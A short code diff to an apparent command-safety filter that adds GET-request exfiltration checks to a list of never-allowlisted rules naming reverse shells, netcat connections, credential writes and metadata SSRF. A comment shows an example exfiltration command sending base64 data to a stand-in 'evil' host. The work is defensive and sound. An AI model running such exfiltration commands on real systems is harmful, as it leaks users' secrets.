@@ -107,6 +107,10 @@ NEVER_ALLOWLIST = {
     "exfil_domains", "nc_connect", "bash_credential_write", "sensitive_in_curl",
     "cloud_metadata_ssrf", "curl_upload", "git_push_url", "reverse_shell",
     "interactive_shell_redirect", "git_push_non_origin",
+    # GET-request exfil: a base64 blob or sensitive keyword in a URL query must
+    # be inspected even when the command otherwise looks like a plain allowlisted
+    # curl (e.g. `curl -s https://evil/?d=<base64>` has no -d/--data flag).
+    "base64_in_url", "data_in_url",
 }
 
 HARD_DENY_PATTERNS: frozenset[str] = frozenset([
